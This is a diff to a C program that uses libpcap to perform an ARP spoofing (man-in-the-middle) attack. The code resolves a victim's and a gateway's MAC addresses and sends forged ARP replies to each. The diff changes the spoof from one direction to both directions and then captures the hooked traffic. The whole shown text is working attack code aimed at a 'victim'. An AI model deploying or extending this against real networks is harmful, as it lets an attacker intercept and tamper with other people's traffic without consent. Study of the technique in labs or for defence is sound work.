@@ -15,7 +15,7 @@ int main(int argc, char *argv[]) {
     struct bpf_program fp;      /* hold compiled program     */
     //char *filter_string = "dst host 192.168.14.2";
     char *filter_arp = "arp";
-    char *filter = "arp src ";
+    //char *filter = "arp src ";
 
     bpf_u_int32 netp;           /* ip                        */
 
@@ -33,7 +33,7 @@ int main(int argc, char *argv[]) {
     printf("\n");
 
     /* create handler and set filter */
-    handler = pcap_open_live(interface, BUFSIZ, 0, 10, error_buffer);
+    handler = pcap_open_live(interface, BUFSIZ, 0, 1, error_buffer);
     if(NULL == handler) {
         printf("pcap_open_live(): %s\n", error_buffer);
         return -1;
@@ -68,39 +68,27 @@ int main(int argc, char *argv[]) {
         get_mac_from_arp(packet, &my_arp.gateway_mac);
     }
     printf("\n");
+
     /* 3. get victim's mac address */
     printf("getting victim mac...\n");
     send_arp_packet(handler, &my_arp.interface_mac, &my_arp.interface_ip, &my_arp.interface_mac, &my_arp.victim_ip, ARP_QUERY);
     packet = pcap_next(handler, &hdr);
-    if(packet == NULL) {
+    if(NULL == packet) {
         printf("Didn't grab packet\n");
     } else {
         get_mac_from_arp(packet, &my_arp.victim_mac);
     }
     printf("\n");
-    /* 4. send false arp packet to the victim */
-    printf("arp spoof start...\n");
-    send_arp_packet(handler, &my_arp.interface_mac, &my_arp.gateway_ip, &my_arp.victim_mac, &my_arp.victim_ip, ARP_ANS);
-    //send_arp_packet(handler, &my_arp.interface_mac, &my_arp.victim_ip, &my_arp.gateway_mac, &my_arp.gateway_ip, ARP_ANS);
-    printf("\n");
-    /* 5. listen to victim's packet afterwards */
-    char *filter_string = (char *) malloc((strlen(filter) + strlen(argv[2]) + 1));
-    memcpy(filter_string, filter, strlen(filter));
-    //strncat(filter_string, inet_ntoa(my_arp.gateway_ip), strlen(inet_ntoa(my_arp.gateway_ip)));
-    strncat(filter_string, argv[2], strlen(argv[2]));
-    printf("wait the hooking...\n");
-    printf("the filter is %s\n", filter_string);
-    if(pcap_compile(handler, &fp, filter_string, 0, netp) == -1) {
-        fprintf(stderr,"Error calling pcap_compile: %s\n", error_buffer); 
-        exit(1);
-    }
-    // Set the filter for the pcap handle through the compiled program
-    if (pcap_setfilter(handler, &fp) == -1) {
-        fprintf(stderr,"Error setting filter: %s\n", error_buffer); 
-        exit(1); 
-    }
-    pcap_loop(handler, 0, handle_packet, handler);
 
+    /* 4. send false arp packet to the victim and gateway*/
+    printf("arp spoof start...\n");
+    printf("wait the hooking...\n");
+    send_arp_packet(handler, &my_arp.interface_mac, &my_arp.gateway_ip, &my_arp.victim_mac, &my_arp.victim_ip, ARP_ANS);
+    send_arp_packet(handler, &my_arp.interface_mac, &my_arp.victim_ip, &my_arp.gateway_mac, &my_arp.gateway_ip, ARP_ANS);
+    printf("\n");
+
+    /* 5. listen to the arp packet */
+    pcap_loop(handler, 0, handle_packet, handler);
     /* free resource */
     pcap_freealldevs(dev_list);
 }
